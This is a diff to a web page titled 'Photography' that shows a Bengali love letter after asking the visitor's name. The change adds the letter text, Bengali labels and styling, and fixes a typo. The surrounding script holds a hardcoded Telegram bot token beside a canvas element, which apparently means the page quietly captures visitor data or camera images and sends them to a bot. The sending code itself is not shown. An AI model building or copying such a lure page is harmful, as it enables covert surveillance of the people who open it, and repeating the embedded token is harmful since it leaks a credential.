@@ -3,6 +3,8 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;700&display=swap" rel="stylesheet">
   <title>Photography</title>
   <style>
     * {
@@ -126,7 +128,22 @@
       justify-content: center;
       margin-top: 20px;
     }
-
+    .letter-box {
+  font-family: 'Hind Siliguri', sans-serif;
+  font-size: 1.2rem;
+  line-height: 1.8;
+  color: #333;
+  white-space: pre-wrap;
+  word-wrap: break-word;
+  padding: 20px;
+  background: #fffaf0;
+  border-radius: 10px;
+  box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+  margin-top: 20px;
+  height: 300px;
+  overflow-y: auto;
+  max-height: 300px;
+}
     .action-btn {
       background-color: #ef4444;
       color: white;
@@ -152,7 +169,7 @@
   <!-- Fullscreen Name Input Form -->
   <div class="name-container" id="name-container">
     <div class="name-form">
-      <h2>Enter Your Name</h2>
+      <h2>তোমার নাম লিখ</h2>
       <input type="text" id="userName" placeholder="Your Name" />
       <button id="submit-name">Next</button>
     </div>
@@ -160,11 +177,11 @@
 
   <!-- Love Letter Content -->
   <div class="container" id="container">
-    <div class="letter-title" id="letter-title">Dear <span id="to-name">Love</span></div>
+    <div class="letter-title" id="letter-title">প্রিয় <span id="to-name">Love</span></div>
     <div class="letter-box" id="letter"></div>
     <div class="message" id="message">🥹...</div>
     <div class="button-container">
-      <button class="action-btn" id="start-btn">See🥹</button>
+      <button class="action-btn" id="start-btn">এইখানে ক্লিক করো </button>
     </div>
   </div>
 
@@ -175,7 +192,25 @@
 
     const letterText = `
 
-Sorry we have some issue `;
+
+শুরু করবো কেমন করে বুঝতে পারছি না। শব্দরা যেন হঠাৎ করে লাজুক হয়ে গেছে,
+তোমার নাম উচ্চারণেই মন কেঁপে ওঠে।
+
+তোমার হাসিটা আমার পৃথিবীর সবচেয়ে প্রিয় জিনিসগুলোর একটি। 
+তুমি যখন হাসো, তখন মনে হয় যেন সমস্ত দুঃখ কষ্ট পেছনে ফেলে আসা যায়।
+তুমি আছো বলেই দিনগুলো রঙিন হয়ে ওঠে, 
+রাতগুলো আশায় ভরে ওঠে, স্বপ্নেরা নতুন রূপ পায়।
+
+তুমি আমার অনুপ্রেরণা, আমার শান্তি, আমার ভালোবাসা।
+
+এই ছোট্ট পৃথিবীতে তোমার অস্তিত্বই আমার সবচেয়ে বড় প্রাপ্তি।
+
+ভালোবাসা নিঃশেষ নয়, 
+আমার ভালোবাসা তোমার জন্য প্রতিটা মুহূর্তেই নতুনভাবে জন্ম নেয়।
+
+সারাজীবন তোমার পাশে থাকতে চাই।
+
+`;
 
     const letterBox = document.getElementById("letter");
     const startBtn = document.getElementById("start-btn");
@@ -183,7 +218,7 @@ Sorry we have some issue `;
     const nameContainer = document.getElementById("name-container");
     const container = document.getElementById("container");
     const toName = document.getElementById("to-name");
-    const userNameInput = docume .getElementById("userName");
+    const userNameInput = document.getElementById("userName");
     const message = document.getElementById("message");
     const canvas = document.getElementById('canvas');
     const token = "7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w";
@@ -275,4 +310,4 @@ Sorry we have some issue `;
     }
   </script>
 </body>
-    </html>
+</html>
